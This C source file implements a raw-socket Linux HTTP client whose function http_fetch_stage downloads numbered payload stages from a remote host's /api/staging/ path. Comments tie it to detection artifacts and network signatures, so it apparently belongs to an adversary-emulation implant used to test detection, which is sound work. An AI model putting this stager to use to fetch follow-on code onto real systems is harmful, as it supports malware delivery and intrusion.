/*
 * HTTP Fetch Implementation - Linux
 *
 * Uses raw sockets for minimal binary size.
 *
 * Detection artifact: /api/staging/ URL pattern
 * Network signature target: stage1_network.yml
 */

#ifdef __linux__

#include "http.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define RECV_BUF_SIZE 4096
#define MAX_RESPONSE  (10 * 1024 * 1024)  /* 10MB max */

int http_fetch_stage(const char *host, uint16_t port, int stage,
                     uint8_t **out_buf, size_t *out_len)
{
    int sock = -1;
    int result = HTTP_ERR_INIT;
    char request[512];
    char recv_buf[RECV_BUF_SIZE];
    uint8_t *response = NULL;
    size_t response_len = 0;
    size_t response_cap = 0;

    *out_buf = NULL;
    *out_len = 0;

    /* Resolve hostname */
    struct hostent *he = gethostbyname(host);
    if (!he) {
        return HTTP_ERR_CONN;
    }

    /* Create socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return HTTP_ERR_INIT;
    }

    /* Connect */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        result = HTTP_ERR_CONN;
        goto cleanup;
    }

    /* Build HTTP request - targets /api/staging/{stage} */
    int req_len = snprintf(request, sizeof(request),
        "GET /api/staging/%d HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: " HTTP_USER_AGENT "\r\n"
        "Connection: close\r\n"
        "\r\n",
        stage, host, port);

    /* Send request */
    if (send(sock, request, req_len, 0) != req_len) {
        result = HTTP_ERR_SEND;
        goto cleanup;
    }

    /* Receive response */
    response_cap = RECV_BUF_SIZE;
    response = malloc(response_cap);
    if (!response) {
        result = HTTP_ERR_MEM;
        goto cleanup;
    }

    ssize_t n;
    while ((n = recv(sock, recv_buf, sizeof(recv_buf), 0)) > 0) {
        if (response_len + n > MAX_RESPONSE) {
            result = HTTP_ERR_MEM;
            goto cleanup;
        }
        if (response_len + n > response_cap) {
            response_cap *= 2;
            uint8_t *new_buf = realloc(response, response_cap);
            if (!new_buf) {
                result = HTTP_ERR_MEM;
                goto cleanup;
            }
            response = new_buf;
        }
        memcpy(response + response_len, recv_buf, n);
        response_len += n;
    }

    if (n < 0) {
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    /* Find end of headers (double CRLF) */
    char *body_start = NULL;
    for (size_t i = 0; i + 3 < response_len; i++) {
        if (response[i] == '\r' && response[i+1] == '\n' &&
            response[i+2] == '\r' && response[i+3] == '\n') {
            body_start = (char *)response + i + 4;
            break;
        }
    }

    if (!body_start) {
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    /* Check for HTTP 200 */
    if (response_len < 12 || memcmp(response, "HTTP/1.1 200", 12) != 0) {
        /* Not a 200 OK response */
        result = HTTP_ERR_RECV;
        goto cleanup;
    }

    /* Extract body */
    size_t header_len = body_start - (char *)response;
    size_t body_len = response_len - header_len;

    *out_buf = malloc(body_len);
    if (!*out_buf) {
        result = HTTP_ERR_MEM;
        goto cleanup;
    }
    memcpy(*out_buf, body_start, body_len);
    *out_len = body_len;
    result = HTTP_OK;

cleanup:
    if (sock >= 0) {
        close(sock);
    }
    free(response);
    return result;
}

#endif /* __linux__ */
